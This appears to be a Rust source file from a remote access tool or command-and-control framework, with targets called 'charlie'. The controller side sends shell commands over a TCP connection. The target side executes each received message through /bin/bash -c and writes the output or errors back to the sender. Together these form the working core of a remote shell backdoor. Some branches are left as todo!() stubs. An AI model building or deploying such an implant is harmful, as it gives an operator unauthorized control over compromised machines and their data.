use std::io::Write;
use std::net::TcpStream;
use std::str;
use std::process::{Command, Output};
pub struct Target {
    pub stream: std::net::TcpStream,
    pub os: String,
}

pub fn parse_command_and_write (command: String, stream: &mut TcpStream) {
    let mut command = command.split(" ");
    let command_type = command.next().unwrap();
    match command_type {
        "shell" => {
            let shell_command = command.remainder().unwrap().trim();
            stream.write(shell_command.as_bytes()).unwrap();
        },
        "charlie" => {
            let charlie_command = command.remainder().unwrap().trim();
            match charlie_command {
                "show targets" => {
                    charlie_execute_show_targets(stream);
                    stream.write("\0".as_bytes()).unwrap();
                },
                _ => todo!()
            };
        },
        _ => {
            println!("{} is not a recognized command.", command_type.trim());
            stream.write("\0".as_bytes()).unwrap();
        }
    };
}

fn charlie_execute_show_targets (stream: &TcpStream) {
    let targets = stream.peer_addr();
    match targets {
        Ok(target) => println!("{target}"),
        Err(_) => println!("No targets currently exist")
    };
}

pub fn handle_command_and_write (data: &[u8], connection: &mut std::net::TcpStream) {
    if (data.len() == 1) && data[0] == 0 {
        connection.write("\0".as_bytes()).unwrap();
        connection.flush().unwrap();
    } else {
        let command = shell_execute_command(data);

        if command.status.success() == true { // ensure command success
            let raw = command.stdout;
            let output = str::from_utf8(&raw).unwrap();
    
            if output.len() > 0 {
                connection.write(output.as_bytes()).unwrap();
                connection.flush().unwrap();
            } else {
                connection.write("\0".as_bytes()).unwrap();
                connection.flush().unwrap();
            }
        } else { // catch command error
            let raw = command.stderr;
            let output = str::from_utf8(&raw).unwrap();
    
            if output.len() > 0 {
                connection.write(output.as_bytes()).unwrap();
                connection.flush().unwrap();
            } else {
                connection.write("[UNKNOWN ERROR\n".as_bytes()).unwrap();
                connection.flush().unwrap();
            }
        }
    }
}

fn shell_execute_command(data: &[u8]) -> Output {
    let command = Command::new("/bin/bash")
        .arg("-c")
        .arg(str::from_utf8(&data).unwrap())
        .output()
        .unwrap();

    return command;
}
